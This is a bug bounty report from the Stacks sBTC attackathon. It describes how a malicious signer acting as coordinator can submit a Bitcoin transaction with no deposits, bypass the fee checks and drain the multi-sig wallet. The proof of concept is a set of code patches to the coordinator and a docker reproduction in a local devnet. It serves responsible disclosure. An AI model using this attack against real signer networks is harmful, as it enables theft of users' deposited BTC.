# #38458 \[BC-Critical] The coordinator can submit empty BTC transactions to drain BTC tokens in the mu

**Submitted on Jan 3rd 2025 at 22:23:07 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38458
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Direct loss of funds

## Description

## Brief/Intro

When a signer acts as a coordinator, he will initiate BTC transactions to transfer the deposited BTC to the signer's multi-wallet. The structure of these transactions is as follows.

```
      tx_in      |      tx_out
  signers utxo   |    signers utxo
    deposit 1    |
    deposit 2    |
    deposit 3    |
      ...        |
```

The transaction fees for these transactions are shared by all deposits. And the signer will check each deposit to ensure that the transaction fee does not exceed the user's expectations.

The bug now is that a malicious signer can initiate a BTC transaction without deposits, then all checks on deposits will be bypassed (including transaction fees). And, this BTC transaction will be paid by the multi-sign wallet.

The attacker can use this to make the multi-sign wallet lose all BTC, which will be rewarded to BTC miners. So the attacker can cooperate with BTC miners to steal all BTC.

## Vulnerability Details

The `signer/src/bitcoin/validation.rs::to_input_rows` code is as follows.

```rust
    pub fn to_input_rows(&self) -> Vec<BitcoinTxSigHash> {
        // If any of the inputs or outputs fail validation, then the
        // transaction is invalid, so we won't sign any of the inputs or
        // outputs.
        let is_valid_tx = self.is_valid_tx();

        let validation_results = self.reports.deposits.iter().map(|(_, report)| {
            report.validate(
                self.chain_tip_height,
                &self.tx,
                self.tx_fee,
                self.max_deposit_amount,
            )
        });

        // just a sanity check
        debug_assert_eq!(self.deposit_sighashes.len(), self.reports.deposits.len());

        let deposit_sighashes = self
            .deposit_sighashes
            .iter()
            .copied()
            .zip(validation_results);

        // We know the signers' input is valid. We started by fetching it
        // from our database, so we know it is unspent and valid. Later,
        // each of the signer's inputs were created as part of a
        // transaction chain, so each one is unspent and locked by the
        // signers' "aggregate" private key.
        [(self.signer_sighash, InputValidationResult::Ok)]
            .into_iter()
            .chain(deposit_sighashes)
            .map(|(sighash, validation_result)| BitcoinTxSigHash {
                txid: sighash.txid.into(),
                sighash: sighash.sighash.into(),
                chain_tip: self.chain_tip,
                prevout_txid: sighash.outpoint.txid.into(),
                prevout_output_index: sighash.outpoint.vout,
                prevout_type: sighash.prevout_type,
                validation_result,
                is_valid_tx,
                will_sign: is_valid_tx && validation_result == InputValidationResult::Ok,
            })
            .collect()
    }
```

Please see the above code. For signer, all checks are done based on deposits. But it does not check whether deposits is empty. An attacker can submit an attack transaction (as shown below) to drain all BTC in the multi-sign wallet.

```
      tx_in      |      tx_out
  signers utxo   |    signers utxo
                 |
                 |
                 |
                 |
```

## Impact Details

All BTC deposited by users are at risk.

And If the attacker cooperates with the BTC miner, the attacker can steal these BTC.

## References

None

## Proof of Concept

## Proof of Concept

1. Base on: <https://github.com/stacks-network/sbtc/releases/tag/0.0.9-rc4>
2. Patch `signer/src/config/mod.rs`, add attacker flag config

   ```diff
        /// The minimum bitcoin block height for which the sbtc signers will
        /// backfill bitcoin blocks to.
        pub sbtc_bitcoin_start_height: Option<u64>,
   +    /// @audit;
   +    pub audit_this_signer_is_attacker: Option<bool>,
    }
    
    impl Validatable for SignerConfig {
   ```
3. Patch `signer/src/main.rs`, load attacker flag

   ```diff
        );
    
        // Load the configuration file and/or environment variables.
   -    let settings = Settings::new(args.config)?;
   +    let mut settings = Settings::new(args.config)?;
   +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
   +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
   +        Ok(value) => Some(value.parse::<bool>().unwrap()),
   +        _ => Some(false),
   +    };
   +    tracing::info!("@audit; audit_this_signer_is_attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
        signer::metrics::setup_metrics(settings.signer.prometheus_exporter_endpoint);
    
        // Open a connection to the signer db.
   ```
4. Patch `docker/docker-compose.yml`, add attacker flag

   ```diff
          - postgres-3
        environment:
          <<: *sbtc-signer-environment
   +      AUDIT_THIS_SIGNER_IS_ATTACKER: true
          SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
          SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
          SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
   ```
5. Patch `signer/src/transaction_coordinator.rs`, add attack action. It will ignore all deposits and initiate an attack BTC transaction.

   ```diff
            let pending_requests_fut =
                self.get_pending_requests(bitcoin_chain_tip, aggregate_key, signer_public_keys);
    
            // If Self::get_pending_requests returns Ok(None) then there are no
            // requests to respond to, so let's just exit.
   -        let Some(pending_requests) = pending_requests_fut.await? else {
   +        let Some(mut pending_requests) = pending_requests_fut.await? else {
                tracing::debug!("no requests to handle, exiting");
                return Ok(());
            };
   +        // @audit; begin
   +        let this_signer_is_attacker = self.context.config().signer.audit_this_signer_is_attacker.is_some_and(|x| x);
   +        if this_signer_is_attacker {
   +            pending_requests.signer_state.fee_rate *= 100 as f64;
   +        }
   +        let attack_reports = crate::bitcoin::validation::SbtcReports {
   +            deposits: Vec::new(),
   +            withdrawals: Vec::new(),
   +            signer_state: pending_requests.signer_state,
   +        };
   +        let attack_tx = attack_reports.create_transaction()?;
   +        // @audit; end
            tracing::debug!(
                num_deposits = %pending_requests.deposits.len(),
                num_withdrawals = pending_requests.withdrawals.len(),
                "fetched requests"
            );
            // Construct the transaction package and store it in the database.
   -        let transaction_package = pending_requests.construct_transactions()?;
   +        let mut transaction_package = pending_requests.construct_transactions()?;
   +        // @audit; begin
   +        if this_signer_is_attacker {
   +            if transaction_package.len() != 0 {
   +                tracing::info!("@audit; the origin tx: {:?}", transaction_package[0]);
   +            }
   +            transaction_package = Vec::new();
   +            transaction_package.push(attack_tx);
   +            tracing::info!("@audit; attacker modified the tx: {:?}", transaction_package[0]);
   +        }
   +        // @audit; end

            tracing::info!("@audit; start construct btc tx, transaction_package.len(): {:?}", transaction_package.len());
            self.construct_and_send_bitcoin_presign_request(
   ```
6. Run docker

   ```sh
   make devenv-up
   make devenv-down
   docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
   make devenv-up
   ```
7. Add [this code](https://gist.github.com/al-f4lc0n/6befe01b89669cfb756cf747d7cf030d) to `signer/src/bin/poc9.rs`
8. Patch `signer/Cargo.toml`, add `poc9` bin

   ```diff
   +[[bin]]
   +name = "poc9"
   +path = "src/bin/poc9.rs"
   ```
9. Waiting for the sBTC contract to be deployed. Then run the `poc9` tool. It will send 40 BTC to the signers BTC address and trigger deposits every 10 seconds.

   ```sh
   cargo run -p signer --bin poc9
   ```
10. Wait until the trigger the coordinator is *sbtc-signer-3*. You can check the logs marked with `"@audit;"` to confirm that the attack was triggered
11. In [BTC explorer](http://localhost:8083/), you will find that the BTC transaction initiated by *sbtc-signer-3* is malicious. It does not carry any deposits and withdrawals, but only consumes BTC.
